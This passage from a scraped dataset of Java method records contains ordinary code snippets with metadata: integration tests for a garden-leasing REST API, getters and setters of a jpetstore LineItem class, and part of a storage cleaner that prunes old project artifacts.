"https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingFromOpenToRejectedInUpdateDayRangeByOwner", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingFromOpenToRejectedInUpdateDayRangeByOwner() throws Exception {        leasing.setFrom(Instant.now().plus(1, ChronoUnit.DAYS)); //depends on UPDATE_DAY_RANGE in leasingService        leasing.setTo(Instant.now().plus(200, ChronoUnit.DAYS));        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.REJECTED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isOk())            .andExpect(jsonPath(\"$.status\").value(is(LeasingStatus.REJECTED.toString())));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingFromOpenToRejectedOutOfUpdateRangeByOwner", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingFromOpenToRejectedOutOfUpdateRangeByOwner() throws Exception {        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.REJECTED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isOk())            .andExpect(jsonPath(\"$.status\").value(is(LeasingStatus.REJECTED.toString())));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateLeasingFromOpenToCancelledByRequester", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateLeasingFromOpenToCancelledByRequester() throws Exception {        prepareUpdateTest();        UpdatingLeasingDTO leasingDTO = updatingLeasingMapper.toDto(leasing);        leasingDTO.setStatus(LeasingStatus.CANCELLED);        restLeasingMockMvc.perform(put(\"/api/v1/leasings\")            .contentType(TestUtil.APPLICATION_JSON_UTF8)            .content(TestUtil.convertObjectToJsonBytes(leasingDTO)))            .andExpect(status().isOk())            .andExpect(jsonPath(\"$.status\").value(is(LeasingStatus.CANCELLED.toString())));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasings", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasings() throws Exception {        // Initialize the database        leasing.setPaymentSessionId(getPaymentSessionId());        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList        restLeasingMockMvc.perform(get(\"/api/v1/leasings?sort=id,desc\"))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))            .andExpect(jsonPath(\"$.content.[0].id\").value(is(leasing.getId().intValue())))            .andExpect(jsonPath(\"$.content.[0].from\").value(is(DEFAULT_FROM.toString())))            .andExpect(jsonPath(\"$.content.[0].to\").value(is(DEFAULT_TO.toString())))            .andExpect(jsonPath(\"$.content.[0].status\").value(is(DEFAULT_STATUS.toString())));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLeasing", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLeasing() throws Exception {        // Initialize the database        leasing.setPaymentSessionId(getPaymentSessionId());        leasingRepository.saveAndFlush(leasing);        // Get the leasing        restLeasingMockMvc.perform(get(\"/api/v1/leasings/{id}\", leasing.getId()))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))            .andExpect(jsonPath(\"$.id\").value(leasing.getId().intValue()))            .andExpect(jsonPath(\"$.from\").value(DEFAULT_FROM.toString()))            .andExpect(jsonPath(\"$.to\").value(DEFAULT_TO.toString()))            .andExpect(jsonPath(\"$.status\").value(DEFAULT_STATUS.toString()));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByFromIsEqualToSomething", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByFromIsEqualToSomething() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where from equals to DEFAULT_FROM        defaultLeasingShouldBeFound(\"from.equals=\" + DEFAULT_FROM);        // Get all the leasingList where from equals to UPDATED_FROM        defaultLeasingShouldNotBeFound(\"from.equals=\" + UPDATED_FROM);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByFromIsInShouldWork", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByFromIsInShouldWork() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where from in DEFAULT_FROM or UPDATED_FROM        defaultLeasingShouldBeFound(\"from.in=\" + DEFAULT_FROM + \",\" + UPDATED_FROM);        // Get all the leasingList where from equals to UPDATED_FROM        defaultLeasingShouldNotBeFound(\"from.in=\" + UPDATED_FROM);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByFromIsNullOrNotNull", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByFromIsNullOrNotNull() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where from is not null        defaultLeasingShouldBeFound(\"from.specified=true\");        // Get all the leasingList where from is null        defaultLeasingShouldNotBeFound(\"from.specified=false\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByToIsEqualToSomething", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByToIsEqualToSomething() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where to equals to DEFAULT_TO        defaultLeasingShouldBeFound(\"to.equals=\" + DEFAULT_TO);        // Get all the leasingList where to equals to UPDATED_TO        defaultLeasingShouldNotBeFound(\"to.equals=\" + UPDATED_TO);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByToIsInShouldWork", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByToIsInShouldWork() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where to in DEFAULT_TO or UPDATED_TO        defaultLeasingShouldBeFound(\"to.in=\" + DEFAULT_TO + \",\" + UPDATED_TO);        // Get all the leasingList where to equals to UPDATED_TO        defaultLeasingShouldNotBeFound(\"to.in=\" + UPDATED_TO);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByToIsNullOrNotNull", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByToIsNullOrNotNull() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where to is not null        defaultLeasingShouldBeFound(\"to.specified=true\");        // Get all the leasingList where to is null        defaultLeasingShouldNotBeFound(\"to.specified=false\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByStatusIsEqualToSomething", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByStatusIsEqualToSomething() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where status equals to DEFAULT_STATUS        defaultLeasingShouldBeFound(\"status.equals=\" + DEFAULT_STATUS);        // Get all the leasingList where status equals to UPDATED_STATUS        defaultLeasingShouldNotBeFound(\"status.equals=\" + UPDATED_STATUS);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByStatusIsInShouldWork", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByStatusIsInShouldWork() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where status in DEFAULT_STATUS or UPDATED_STATUS        defaultLeasingShouldBeFound(\"status.in=\" + DEFAULT_STATUS + \",\" + UPDATED_STATUS);        // Get all the leasingList where status equals to UPDATED_STATUS        defaultLeasingShouldNotBeFound(\"status.in=\" + UPDATED_STATUS);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllLeasingsByStatusIsNullOrNotNull", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllLeasingsByStatusIsNullOrNotNull() throws Exception {        // Initialize the database        leasingRepository.saveAndFlush(leasing);        // Get all the leasingList where status is not null        defaultLeasingShouldBeFound(\"status.specified=true\");        // Get all the leasingList where status is null        defaultLeasingShouldNotBeFound(\"status.specified=false\");    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "defaultLeasingShouldBeFound", "params": ["String"], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void defaultLeasingShouldBeFound(String filter) throws Exception {        restLeasingMockMvc.perform(get(\"/api/v1/leasings?sort=id,desc&\" + filter))            .andDo(MockMvcResultHandlers.print())            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))            .andExpect(jsonPath(\"$.content.[0].id\").value(is(leasing.getId().intValue())))            .andExpect(jsonPath(\"$.content.[0].from\").value(is(DEFAULT_FROM.toString())))            .andExpect(jsonPath(\"$.content.[0].to\").value(is(DEFAULT_TO.toString())))            .andExpect(jsonPath(\"$.content.[0].status\").value(is(DEFAULT_STATUS.toString())));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "defaultLeasingShouldNotBeFound", "params": ["String"], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void defaultLeasingShouldNotBeFound(String filter) throws Exception {        restLeasingMockMvc.perform(get(\"/api/v1/leasings?sort=id,desc&\" + filter))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))            .andExpect(jsonPath(\"$.content\").isEmpty());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNonExistingLeasing", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingLeasing() throws Exception {        // Get the leasing        restLeasingMockMvc.perform(get(\"/api/v1/leasings/{id}\", Long.MAX_VALUE))            .andExpect(status().isNotFound());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "equalsVerifier", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void equalsVerifier() {        Leasing leasing1 = new Leasing();        leasing1.setId(1L);        Leasing leasing2 = new Leasing();        leasing2.setId(leasing1.getId());        assertThat(leasing1).isEqualTo(leasing2);        leasing2.setId(2L);        assertThat(leasing1).isNotEqualTo(leasing2);        leasing1.setId(null);        assertThat(leasing1).isNotEqualTo(leasing2);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dtoEqualsVerifier", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dtoEqualsVerifier() {        LeasingDTO leasingDTO1 = new LeasingDTO();        leasingDTO1.setId(1L);        LeasingDTO leasingDTO2 = new LeasingDTO();        assertThat(leasingDTO1).isNotEqualTo(leasingDTO2);        leasingDTO2.setId(leasingDTO1.getId());        assertThat(leasingDTO1).isEqualTo(leasingDTO2);        leasingDTO2.setId(2L);        assertThat(leasingDTO1).isNotEqualTo(leasingDTO2);        leasingDTO1.setId(null);        assertThat(leasingDTO1).isNotEqualTo(leasingDTO2);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testEntityFromId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testEntityFromId() {        assertThat(leasingMapper.fromId(42L).getId()).isEqualTo(42);        assertThat(leasingMapper.fromId(null)).isNull();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLeasingDateRanges", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLeasingDateRanges() throws Exception {        Leasing leasing1 = new Leasing();        Leasing leasing2 = new Leasing();        Leasing leasing3 = new Leasing();        leasing1.setGardenField(gardenField);        leasing1.setUser(requester);        leasing2.setGardenField(gardenField);        leasing2.setUser(requester);        leasing3.setGardenField(gardenField);        leasing3.setUser(requester);        leasing1.setStatus(LeasingStatus.RESERVED);        leasing2.setStatus(LeasingStatus.RESERVED);        leasing3.setStatus(LeasingStatus.REJECTED);        Instant from1 = LocalDateTime.of(2019, Month.MARCH, 1, 0, 0).atZone(ZoneId.of(\"Europe/Vienna\")).toInstant();        Instant to1 = LocalDateTime.of(2019, Month.JUNE, 15, 23, 59).atZone(ZoneId.of(\"Europe/Vienna\")).toInstant();        Instant from2 = LocalDateTime.of(2019, Month.JUNE, 16, 0, 0).atZone(ZoneId.of(\"Europe/Vienna\")).toInstant();        Instant to2 = LocalDateTime.of(2019, Month.SEPTEMBER, 23, 23, 59).atZone(ZoneId.of(\"Europe/Vienna\")).toInstant();        Instant from3 = LocalDateTime.of(2019, Month.MAY, 16, 0, 0).atZone(ZoneId.of(\"Europe/Vienna\")).toInstant();        Instant to3 = LocalDateTime.of(2019, Month.AUGUST, 23, 23, 59).atZone(ZoneId.of(\"Europe/Vienna\")).toInstant();        leasing1.setFrom(from1);        leasing1.setTo(to1);        leasing1.setPaymentSessionId(getPaymentSessionId());        leasing2.setFrom(from2);        leasing2.setTo(to2);        leasing2.setPaymentSessionId(getPaymentSessionId());        leasing3.setFrom(from3);        leasing3.setTo(to3);        leasing3.setPaymentSessionId(getPaymentSessionId());        leasingRepository.save(leasing1);        leasingRepository.save(leasing2);        leasingRepository.save(leasing3);        assertThat(leasingRepository.findAll().size()).isEqualTo(3);        restLeasingMockMvc.perform(get(\"/api/v1/leasings/{gardenFieldId}/\" +                \"leasedDateRanges?from=\" + from1.minus(1, ChronoUnit.DAYS) +                \"&to=\" + to2.plus(1, ChronoUnit.DAYS)            , leasing.getGardenField().getId()))            .andDo(MockMvcResultHandlers.print())            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))            .andExpect(jsonPath(\"$.length()\").value(is(2)))            .andExpect(jsonPath(\"$.[0].from\").value(is(from1.toString())))            .andExpect(jsonPath(\"$.[0].to\").value(is(to1.toString())))            .andExpect(jsonPath(\"$.[1].from\").value(is(from2.toString())))            .andExpect(jsonPath(\"$.[1].to\").value(is(to2.toString())));    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createRequester", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createRequester() {        requester = new User();        requester.setLogin(REQUESTER_LOGIN);        requester.setPassword(RandomStringUtils.random(60));        requester.setActivated(true);        requester.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);        requester.setFirstName(DEFAULT_FIRSTNAME);        requester.setLastName(DEFAULT_LASTNAME);        requester.setBankAccountIBAN(DEFAULT_IBAN);        userRepository.saveAndFlush(requester);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createOwner", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createOwner() {        owner = new User();        owner.setLogin(OWNER_LOGIN);        owner.setPassword(RandomStringUtils.random(60));        owner.setActivated(true);        owner.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);        owner.setFirstName(\"owner\");        owner.setLastName(\"owner\");        owner.setBankAccountIBAN(DEFAULT_IBAN);        userRepository.saveAndFlush(owner);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createOtherUser", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createOtherUser() {        otherUser = new User();        otherUser.setLogin(OTHER_USER_LOGIN);        otherUser.setPassword(RandomStringUtils.random(60));        otherUser.setActivated(true);        otherUser.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);        otherUser.setFirstName(\"other\");        otherUser.setLastName(\"user\");        otherUser.setBankAccountIBAN(DEFAULT_IBAN);        userRepository.saveAndFlush(otherUser);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "prepareUpdateTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void prepareUpdateTest() {        leasing.setPaymentSessionId(getPaymentSessionId());        leasing = leasingRepository.saveAndFlush(leasing);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/LeasingControllerIT.java", "stars": "2", "class": {"name": "LeasingControllerIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOrderId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getOrderId() {    return orderId;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setOrderId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setOrderId(int orderId) {    this.orderId = orderId;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getLineNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getLineNumber() {    return lineNumber;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setLineNumber", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLineNumber(int lineNumber) {    this.lineNumber = lineNumber;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getItemId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getItemId() {    return itemId;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setItemId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setItemId(String itemId) {    this.itemId = itemId;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getUnitPrice", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "  public BigDecimal getUnitPrice() {    return unitPrice;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setUnitPrice", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUnitPrice(BigDecimal unitprice) {    this.unitPrice = unitprice;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getTotal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "  public BigDecimal getTotal() {    return total;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Item", "snippet": "  public Item getItem() {    return item;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setItem", "params": ["Item"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setItem(Item item) {    this.item = item;    calculateTotal();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getQuantity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getQuantity() {    return quantity;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setQuantity", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setQuantity(int quantity) {    this.quantity = quantity;    calculateTotal();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "calculateTotal", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void calculateTotal() {    if (item != null && item.getListPrice() != null) {      total = item.getListPrice().multiply(new BigDecimal(quantity));    } else {      total = null;    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/jpetstore/LineItem.java", "stars": "15", "class": {"name": "LineItem", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "isCleanupPermitted", "params": [], "throws": null, "modifiers": [], "return_type": "boolean", "snippet": "  boolean isCleanupPermitted() {    return this.maxArtifactsPerProject > 0;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/storage/StorageCleaner.java", "stars": "18", "class": {"name": "StorageCleaner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "cleanupProjectArtifacts", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void cleanupProjectArtifacts(final int projectId) {    if (!isCleanupPermitted()) {      return;    }    final Set<String> allResourceIds = findResourceIdsToDelete(projectId);    if (allResourceIds.size() == 0) {      return;    }    log.warn(String.format(\"Deleting project artifacts [id: %d]: %s\", projectId, allResourceIds));    allResourceIds.forEach(this::delete);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/storage/StorageCleaner.java", "stars": "18", "class": {"name": "StorageCleaner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "findResourceIdsToDelete", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "Set<String>", "snippet": "  private Set<String> findResourceIdsToDelete(final int projectId) {    final List<String> resourceIdOrderedList = fetchResourceIdOrderedList(projectId);    if (resourceIdOrderedList.size() <= this.maxArtifactsPerProject) {      return Collections.emptySet();    }    final Set<String> allResourceIds = new HashSet<>(resourceIdOrderedList);    final Set<String> doNotDeleteSet = new HashSet<>(        resourceIdOrderedList.subList(0, this.maxArtifactsPerProject));    allResourceIds.removeAll(doNotDeleteSet);    return allResourceIds;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/storage/StorageCleaner.java", "stars": "18", "class": {"name": "StorageCleaner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "delete", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean delete(final String resourceId) {    final boolean isDeleted = this.storage.delete(resourceId) && removeDbEntry(resourceId);    if (!isDeleted) {      log.info(\"Failed to delete resourceId: \" + resourceId);    }    return isDeleted;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/storage/StorageCleaner.java", "stars": "18", "class": {"name": "StorageCleaner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "removeDbEntry", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean removeDbEntry(final String resourceId) {    try {      final int nAffectedRows = this.databaseOperator.update(SQL_DELETE_RESOURCE_ID, resourceId);      return nAffectedRows > 0;    } catch (final SQLException e) {      log.error(\"Error while deleting DB metadata resource ID: \" + resourceId, e);    }    return false;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/storage/StorageCleaner.java", "stars": "18", "class": {"name": "StorageCleaner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fetchResourceIdOrderedList", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "List<String>", "snippet": "  private List<String> 